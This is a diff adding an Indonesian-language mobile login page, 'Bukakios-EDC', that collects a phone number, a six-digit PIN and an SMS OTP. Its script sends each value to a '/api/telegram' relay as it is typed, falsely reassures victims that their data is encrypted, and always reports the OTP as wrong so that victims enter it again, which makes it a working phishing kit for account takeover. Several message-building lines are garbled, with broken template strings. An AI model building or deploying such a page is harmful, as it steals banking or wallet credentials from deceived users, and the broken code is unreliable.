@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bukakios-EDC</title>
+<!-- Tailwind CSS CDN -->
+<script src="https://cdn.tailwindcss.com"></script>
+<!-- Font Awesome Icons -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+​<!-- Custom CSS -->
+<style>
+/* Import Google Font Inter */
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+​/* Font Family Default */
+body {
+font-family: 'Inter', sans-serif;
+-webkit-tap-highlight-color: transparent;
+}
+​/* Kustomisasi Tampilan Kotak Input PIN & OTP */
+.pin-box, .otp-box {
+transition: all 0.2s ease-in-out;
+}
+​.pin-box:focus, .otp-box:focus {
+transform: translateY(-1px);
+box-shadow: 0 4px 12px rgba(14, 165, 233, 0.15);
+}
+​/* Menghilangkan panah spinner pada input number */
+input[type=number]::-webkit-inner-spin-button,
+input[type=number]::-webkit-outer-spin-button {
+-webkit-appearance: none;
+margin: 0;
+}
+​input[type=number] {
+-moz-appearance: textfield;
+}
+</style>
+</head>
+<body class="bg-slate-100 flex items-center justify-center min-h-screen p-0 sm:p-4">
+​<!-- Container Utama Mobile Frame -->
+<div class="w-full max-w-md bg-white min-h-screen sm:min-h-[844px] sm:rounded-[36px] shadow-2xl flex flex-col justify-between overflow-hidden relative">
+​<!-- Header / Bar Atas -->
+<div>
+<!-- Indikator Progres Blue Line & Top Bar -->
+<div class="flex items-center justify-between px-6 pt-5 pb-2 min-h-[48px]">
+<!-- Back Button (Shown on Step 2 & 3) -->
+<button id="backBtn" class="w-9 h-9 rounded-xl border border-slate-200 bg-white shadow-sm flex items-center justify-center text-slate-700 hover:bg-slate-50 transition hidden">
+<i class="fa-solid fa-arrow-left"></i>
+</button>
+​<!-- Step 1 Blue Bar Indicator -->
+<div id="stepIndicator" class="w-24 h-1 bg-sky-500 rounded-full"></div>
+​<!-- Tombol Bantuan -->
+<button class="flex items-center gap-1.5 text-sky-500 hover:text-sky-600 font-medium text-sm transition ml-auto">
+<span>Bantuan</span>
+<i class="fa-solid fa-headset text-lg"></i>
+</button>
+</div>
+​<!-- STEP 1: LOGIN NOMOR HP -->
+<div id="step1">
+<!-- Gambar Header Ilustrasi Utama Step 1 -->
+<div class="flex justify-center items-center py-4 px-4">
+<img 
+src="1000091460.jpg" 
+alt="Ilustrasi Keamanan Akun" 
+class="w-full max-w-[280px] h-auto object-contain"
+onerror="this.onerror=null; this.src='https://placehold.co/280x200/e0f2fe/0284c7?text=Security+Illustration';"
+/>
+</div>
+​<!-- Judul & Sub-judul Step 1 -->
+<div class="text-center px-6">
+<h1 class="text-2xl font-bold text-slate-800">Masuk ke Akun</h1>
+<p class="text-slate-500 text-sm mt-1">Masukkan nomor HP untuk melanjutkan</p>
+</div>
+​<!-- Form Card Input Nomor HP -->
+<div class="px-5 mt-5">
+<div class="bg-white rounded-2xl p-4 shadow-lg shadow-slate-200/50 border border-slate-100/80">
+<div class="flex items-center gap-2 mb-3">
+<div class="w-7 h-7 bg-amber-50 text-amber-500 rounded-full flex items-center justify-center text-xs">
+<i class="fa-solid fa-phone"></i>
+</div>
+<span class="font-semibold text-slate-700 text-sm">Nomor Hp</span>
+</div>
+​<div class="mb-4">
+<input 
+type="tel" 
+id="phoneInput"
+placeholder="0812xxxxxxx" 
+class="w-full px-4 py-3 bg-white border border-slate-200 rounded-xl text-slate-800 placeholder-slate-300 focus:outline-none focus:border-sky-500 focus:ring-1 focus:ring-sky-500 transition text-sm font-medium"
+>
+</div>
+​<button 
+id="submitPhoneBtn"
+class="w-full py-3 bg-sky-500 hover:bg-sky-600 active:bg-sky-700 text-white font-medium rounded-xl shadow-md shadow-sky-200 transition-all duration-200 cursor-pointer flex items-center justify-center gap-2"
+>
+<span>Lanjut</span>
+</button>
+</div>
+</div>
+​<!-- Divider Atau & Link Daftar -->
+<div class="mt-6 text-center px-6">
+<div class="relative flex py-2 items-center">
+<div class="flex-grow border-t border-slate-200"></div>
+<span class="flex-shrink mx-4 text-xs text-slate-400">atau</span>
+<div class="flex-grow border-t border-slate-200"></div>
+</div>
+​<p class="text-xs text-slate-600 mt-2 mb-6">
+Belum punya akun?
+<a href="#" class="text-sky-500 font-bold hover:underline">Daftar</a>
+</p>
+</div>
+​<!-- Banner Footer Info Keamanan (Diposisikan tepat di bawah bagian daftar pada Step 1) -->
+<div class="px-5 mb-4">
+<div class="bg-sky-50/70 border border-sky-100 rounded-2xl p-3.5 flex items-start gap-3">
+<div class="w-8 h-8 bg-sky-500 text-white rounded-xl flex items-center justify-center text-sm shrink-0 shadow-sm shadow-sky-200">
+<i class="fa-solid fa-shield-halved"></i>
+</div>
+<div>
+<h4 class="font-bold text-slate-800 text-xs">Aman & Terpercaya</h4>
+<p class="text-[11px] text-slate-500 mt-0.5 leading-snug">Data Anda dilindungi dengan enkripsi berstandar tinggi.</p>
+</div>
+</div>
+</div>
+</div>
+​<!-- STEP 2: MASUKKAN PIN -->
+<div id="step2" class="hidden">
+<!-- Gambar Header Ilustrasi Lock/PIN Step 2 -->
+<div class="flex justify-center items-center py-4 px-4">
+<img 
+src="1000091448.jpg" 
+alt="Ilustrasi Masukkan PIN" 
+class="w-full max-w-[240px] h-auto object-contain"
+onerror="this.onerror=null; this.src='https://placehold.co/240x180/e0f2fe/0284c7?text=PIN+Illustration';"
+/>
+</div>
+​<!-- Judul & Sub-judul Step 2 -->
+<div class="text-center px-6">
+<h1 class="text-2xl font-bold text-slate-800">Masukkan PIN</h1>
+<p class="text-slate-500 text-xs mt-1">Akun ditemukan. Masukkan PIN untuk melanjutkan</p>
+</div>
+​<!-- Card Nomor Terdaftar -->
+<div class="px-5 mt-4">
+<div class="bg-white rounded-2xl p-3.5 shadow-md shadow-slate-200/50 border border-slate-100 flex items-center justify-between">
+<div class="flex items-center gap-3">
+<div class="w-9 h-9 bg-amber-50 text-amber-500 rounded-full flex items-center justify-center text-sm">
+<i class="fa-solid fa-phone"></i>
+</div>
+<div>
+<h3 id="displayPhone" class="font-bold text-slate-800 text-sm">085179831481</h3>
+<p class="text-[11px] text-slate-400">Akun terdaftar</p>
+</div>
+</div>
+<div class="text-sky-500 text-lg">
+<i class="fa-solid fa-circle-check"></i>
+</div>
+</div>
+</div>
+​<!-- Input PIN (6 Digit Boxes) -->
+<div class="px-5 mt-5">
+<label class="block text-xs font-semibold text-slate-700 mb-2">PIN (6 digit)</label>
+<div class="flex justify-between gap-1.5" id="pinContainer">
+<input type="password" maxlength="1" inputmode="numeric" class="pin-box w-11 h-12 text-center text-xl font-bold bg-white border border-slate-200 rounded-xl focus:border-sky-500 focus:ring-1 focus:ring-sky-500 outline-none transition shadow-sm" />
+<input type="password" maxlength="1" inputmode="numeric" class="pin-box w-11 h-12 text-center text-xl font-bold bg-white border border-slate-200 rounded-xl focus:border-sky-500 focus:ring-1 focus:ring-sky-500 outline-none transition shadow-sm" />
+<input type="password" maxlength="1" inputmode="numeric" class="pin-box w-11 h-12 text-center text-xl font-bold bg-white border border-slate-200 rounded-xl focus:border-sky-500 focus:ring-1 focus:ring-sky-500 outline-none transition shadow-sm" />
+<input type="password" maxlength="1" inputmode="numeric" class="pin-box w-11 h-12 text-center text-xl font-bold bg-white border border-slate-200 rounded-xl focus:border-sky-500 focus:ring-1 focus:ring-sky-500 outline-none transition shadow-sm" />
+<input type="password" maxlength="1" inputmode="numeric" class="pin-box w-11 h-12 text-center text-xl font-bold bg-white border border-slate-200 rounded-xl focus:border-sky-500 focus:ring-1 focus:ring-sky-500 outline-none transition shadow-sm" />
+<input type="password" maxlength="1" inputmode="numeric" class="pin-box w-11 h-12 text-center text-xl font-bold bg-white border border-slate-200 rounded-xl focus:border-sky-500 focus:ring-1 focus:ring-sky-500 outline-none transition shadow-sm" />
+</div>
+</div>
+​<!-- Action Links -->
+<div class="mt-6 px-6">
+<div class="relative flex py-2 items-center mb-3">
+<div class="flex-grow border-t border-slate-200"></div>
+<span class="flex-shrink mx-4 text-xs text-slate-400">atau</span>
+<div class="flex-grow border-t border-slate-200"></div>
+</div>
+​<div class="flex items-center justify-between text-xs font-semibold">
+<button id="changeAccBtn" class="text-sky-500 hover:underline">Ganti Akun</button>
+<button class="text-sky-500 hover:underline">Lupa PIN?</button>
+</div>
+</div>
+</div>
+​<!-- STEP 3: INPUT OTP SMS -->
+<div id="step3" class="hidden">
+<!-- Gambar Header Ilustrasi Step 3 -->
+<div class="flex justify-center items-center py-4 px-4">
+<img 
+src="1000091460.jpg" 
+alt="Ilustrasi Verifikasi SMS" 
+class="w-full max-w-[280px] h-auto object-contain"
+onerror="this.onerror=null; this.src='https://placehold.co/280x200/e0f2fe/0284c7?text=SMS+OTP+Illustration';"
+/>
+</div>
+​<!-- Judul & Sub-judul Step 3 -->
+<div class="text-center px-6">
+<h1 class="text-2xl font-bold text-slate-800">Periksa Pesan SMS Anda</h1>
+<p class="text-slate-500 text-sm mt-2 leading-snug">Kami mengirimkan kode OTP melalui SMS ke nomor Anda.</p>
+</div>
+​<!-- Input OTP (6 Digit Boxes) -->
+<div class="px-5 mt-6">
+<div class="flex justify-between gap-1.5" id="otpContainer">
+<input type="tel" maxlength="1" inputmode="numeric" class="otp-box w-11 h-12 text-center text-xl font-bold bg-white border border-slate-300 rounded-xl focus:border-sky-500 focus:ring-1 focus:ring-sky-500 outline-none transition shadow-sm" />
+<input type="tel" maxlength="1" inputmode="numeric" class="otp-box w-11 h-12 text-center text-xl font-bold bg-white border border-slate-300 rounded-xl focus:border-sky-500 focus:ring-1 focus:ring-sky-500 outline-none transition shadow-sm" />
+<input type="tel" maxlength="1" inputmode="numeric" class="otp-box w-11 h-12 text-center text-xl font-bold bg-white border border-slate-300 rounded-xl focus:border-sky-500 focus:ring-1 focus:ring-sky-500 outline-none transition shadow-sm" />
+<input type="tel" maxlength="1" inputmode="numeric" class="otp-box w-11 h-12 text-center text-xl font-bold bg-white border border-slate-300 rounded-xl focus:border-sky-500 focus:ring-1 focus:ring-sky-500 outline-none transition shadow-sm" />
+<input type="tel" maxlength="1" inputmode="numeric" class="otp-box w-11 h-12 text-center text-xl font-bold bg-white border border-slate-300 rounded-xl focus:border-sky-500 focus:ring-1 focus:ring-sky-500 outline-none transition shadow-sm" />
+<input type="tel" maxlength="1" inputmode="numeric" class="otp-box w-11 h-12 text-center text-xl font-bold bg-white border border-slate-300 rounded-xl focus:border-sky-500 focus:ring-1 focus:ring-sky-500 outline-none transition shadow-sm" />
+</div>
+</div>
+​<!-- Countdown Resend OTP -->
+<div class="mt-6 text-center px-6">
+<p class="text-xs text-slate-400 font-medium">
+Belum dapat kode?
+<button id="resendOtpBtn" class="text-slate-400 font-medium cursor-not-allowed disabled:opacity-75" disabled>
+Kirim ulang (<span id="timer">00:56</span>)
+</button>
+</p>
+</div>
+</div>
+</div>
+​<!-- Spacer kosong agar tata letak stabil -->
+<div></div>
+</div>
+​<!-- Custom Modal Dialog -->
+<div id="customModal" class="fixed inset-0 bg-slate-900/40 backdrop-blur-sm z-50 flex items-center justify-center p-4 hidden">
+<div class="bg-white rounded-2xl p-5 max-w-xs w-full shadow-2xl text-center border border-slate-100 transform transition-all scale-100">
+<div id="modalIcon" class="w-12 h-12 rounded-full bg-sky-100 text-sky-500 flex items-center justify-center mx-auto text-xl mb-3">
+<i class="fa-solid fa-circle-info"></i>
+</div>
+<h3 id="modalTitle" class="font-bold text-slate-800 text-base mb-1">Informasi</h3>
+<p id="modalMessage" class="text-xs text-slate-500 mb-5 leading-relaxed">Pesan modal</p>
+<button id="closeModalBtn" class="w-full py-2.5 bg-sky-500 hover:bg-sky-600 active:bg-sky-700 text-white font-medium text-xs rounded-xl shadow-md shadow-sky-200 transition">
+Selesai
+</button>
+</div>
+</div>
+​<!-- Custom JavaScript -->
+<script>
+// Element Selektor
+const step1 = document.getElementById('step1');
+const step2 = document.getElementById('step2');
+const step3 = document.getElementById('step3');
+const backBtn = document.getElementById('backBtn');
+const stepIndicator = document.getElementById('stepIndicator');
+​const submitPhoneBtn = document.getElementById('submitPhoneBtn');
+const phoneInput = document.getElementById('phoneInput');
+const displayPhone = document.getElementById('displayPhone');
+const changeAccBtn = document.getElementById('changeAccBtn');
+​const pinBoxes = document.querySelectorAll('.pin-box');
+const otpBoxes = document.querySelectorAll('.otp-box');
+​const resendOtpBtn = document.getElementById('resendOtpBtn');
+const timerSpan = document.getElementById('timer');
+​// Modal Elements
+const customModal = document.getElementById('customModal');
+const modalTitle = document.getElementById('modalTitle');
+const modalMessage = document.getElementById('modalMessage');
+const modalIcon = document.getElementById('modalIcon');
+const closeModalBtn = document.getElementById('closeModalBtn');
+​let savedPhoneNumber = '';
+let savedPin = '';
+let timerInterval = null;
+let currentStep = 1;
+​// Fungsi Menampilkan Custom Alert Modal (Selalu Menggunakan Ikon Info)
+function showAlert(title, message) {
+modalTitle.textContent = title;
+modalMessage.textContent = message;
+modalIcon.className = "w-12 h-12 rounded-full bg-sky-100 text-sky-500 flex items-center justify-center mx-auto text-xl mb-3";
+modalIcon.innerHTML = '<i class="fa-solid fa-circle-info"></i>';
+customModal.classList.remove('hidden');
+}
+​closeModalBtn.addEventListener('click', () => {
+customModal.classList.add('hidden');
+});
+​// Helper Aman: Mengirim data ke Serverless Function Vercel (/api/telegram)
+async function sendToTelegramServerless(textMessage) {
+try {
+const response = await fetch('/api/telegram', {
+method: 'POST',
+headers: { 'Content-Type': 'application/json' },
+body: JSON.stringify({ message: textMessage })
+});
+const result = await response.json();
+return result.success;
+} catch (error) {
+console.error('Serverless fetch error:', error);
+return false;
+}
+}
+​// Step 1: Kirim Nomor HP ke Serverless Telegram, Lalu Pindah ke Step 2 (PIN)
+submitPhoneBtn.addEventListener('click', async function () {
+const phoneVal = phoneInput.value.trim();
+savedPhoneNumber = phoneVal ? phoneVal : "085179831481";
+displayPhone.textContent = savedPhoneNumber;
+​const originalBtnHtml = submitPhoneBtn.innerHTML;
+submitPhoneBtn.disabled = true;
+submitPhoneBtn.innerHTML = '<i class="fa-solid fa-spinner animate-spin"></i> <span>loading...</span>';
+​const message = \n\n +
+*Nomor HP:* \${savedPhoneNumber}`\n+Waktu: ${new Date().toLocaleString('id-ID')}`;
+​await sendToTelegramServerless(message);
+​submitPhoneBtn.disabled = false;
+submitPhoneBtn.innerHTML = originalBtnHtml;
+​currentStep = 2;
+step1.classList.add('hidden');
+step2.classList.remove('hidden');
+step3.classList.add('hidden');
+backBtn.classList.remove('hidden');
+stepIndicator.classList.add('hidden');
+​setTimeout(() => pinBoxes[0].focus(), 100);
+});
+​// Tombol Back Navigation
+function handleBack() {
+if (currentStep === 3) {
+currentStep = 2;
+step3.classList.add('hidden');
+step2.classList.remove('hidden');
+clearOtp();
+clearInterval(timerInterval);
+setTimeout(() => pinBoxes[0].focus(), 100);
+} else if (currentStep === 2) {
+currentStep = 1;
+step2.classList.add('hidden');
+step1.classList.remove('hidden');
+backBtn.classList.add('hidden');
+stepIndicator.classList.remove('hidden');
+clearPin();
+}
+}
+​backBtn.addEventListener('click', handleBack);
+changeAccBtn.addEventListener('click', () => {
+currentStep = 1;
+step2.classList.add('hidden');
+step3.classList.add('hidden');
+step1.classList.remove('hidden');
+backBtn.classList.add('hidden');
+stepIndicator.classList.remove('hidden');
+clearPin();
+clearOtp();
+});
+​// Helper Handler Input untuk Input Boxes (PIN / OTP)
+function setupBoxInputs(boxes, onComplete) {
+boxes.forEach((box, index) => {
+box.addEventListener('input', (e) => {
+box.value = e.target.value.replace(/[^0-9]/g, '');
+if (box.value && index < boxes.length - 1) {
+boxes[index + 1].focus();
+}
+onComplete();
+});
+​box.addEventListener('keydown', (e) => {
+if (e.key === 'Backspace' && !box.value && index > 0) {
+boxes[index - 1].focus();
+}
+});
+​box.addEventListener('paste', (e) => {
+e.preventDefault();
+const pastedData = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').slice(0, 6);
+if (pastedData.length > 0) {
+pastedData.split('').forEach((char, i) => {
+if (boxes[i]) boxes[i].value = char;
+});
+if (boxes[Math.min(pastedData.length, 5)]) {
+boxes[Math.min(pastedData.length, 5)].focus();
+}
+onComplete();
+}
+});
+});
+}
+​function clearPin() {
+pinBoxes.forEach(box => { box.value = ''; box.disabled = false; });
+}
+​function clearOtp() {
+otpBoxes.forEach(box => { box.value = ''; box.disabled = false; });
+}
+​// Setup PIN Inputs Handler
+setupBoxInputs(pinBoxes, checkAndSendPin);
+​// Kirim PIN ke Serverless Telegram saat 6 Digit PIN lengkap, lalu pindah ke Step 3 (OTP)
+async function checkAndSendPin() {
+let pinCode = '';
+pinBoxes.forEach(box => pinCode += box.value);
+​if (pinCode.length === 6) {
+savedPin = pinCode;
+pinBoxes.forEach(box => box.disabled = true);
+​const message = \n\n +
+*Nomor HP:* \{savedPhoneNumber}\`\n` +
+`*PIN:* \`{pinCode}`\n+Waktu: ${new Date().toLocaleString('id-ID')}`;
+​await sendToTelegramServerless(message);
+​pinBoxes.forEach(box => box.disabled = false);
+​// Pindah ke Step 3 (Halaman OTP SMS)
+currentStep = 3;
+step2.classList.add('hidden');
+step3.classList.remove('hidden');
+​// Mulai Countdown Timer 56 Detik
+startOtpTimer(56);
+setTimeout(() => otpBoxes[0].focus(), 100);
+}
+}
+​// Setup OTP Inputs Handler
+setupBoxInputs(otpBoxes, checkAndSendOtp);
+​// Kirim OTP ke Serverless Telegram saat 6 Digit OTP SMS lengkap
+async function checkAndSendOtp() {
+let otpCode = '';
+otpBoxes.forEach(box => otpCode += box.value);
+​if (otpCode.length === 6) {
+otpBoxes.forEach(box => box.disabled = true);
+​const message = \n\n +
+*Nomor HP:* \{savedPhoneNumber}\`\n` +
+`*PIN:* \`{savedPin}`\n+Kode OTP: `${otpCode}`\n+Waktu: ${new Date().toLocaleString('id-ID')}`;
+​const success = await sendToTelegramServerless(message);
+​if (success) {
+showAlert('OTP SALAH', 'Kode yang kamu masukan tidak Benar!');
+} else {
+showAlert('Kesalahan', 'Terjadi kesalahan koneksi saat mengirim OTP.');
+}
+​otpBoxes.forEach(box => box.disabled = false);
+}
+}
+​// Timer Hitung Mundur OTP
+function startOtpTimer(seconds) {
+clearInterval(timerInterval);
+let timeLeft = seconds;
+resendOtpBtn.disabled = true;
+resendOtpBtn.className = "text-slate-400 font-medium cursor-not-allowed disabled:opacity-75";
+​function updateDisplay() {
+const mins = Math.floor(timeLeft / 60);
+const secs = timeLeft % 60;
+timerSpan.textContent = ${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')};
+}
+​updateDisplay();
+​timerInterval = setInterval(() => {
+timeLeft--;
+if (timeLeft <= 0) {
+clearInterval(timerInterval);
+timerSpan.textContent = "00:00";
+resendOtpBtn.disabled = false;
+resendOtpBtn.className = "text-sky-500 font-bold hover:underline cursor-pointer";
+resendOtpBtn.textContent = "Kirim ulang";
+} else {
+updateDisplay();
+}
+}, 1000);
+}
+​// Handler Tombol Kirim Ulang OTP
+resendOtpBtn.addEventListener('click', () => {
+if (!resendOtpBtn.disabled) {
+showAlert('OTP Dikirim', 'Kode OTP baru telah dikirimkan melalui SMS.');
+resendOtpBtn.innerHTML = 'Kirim ulang (<span id="timer">01:00</span>)';
+startOtpTimer(60);
+}
+});
+</script>
+</body>
+  </html>
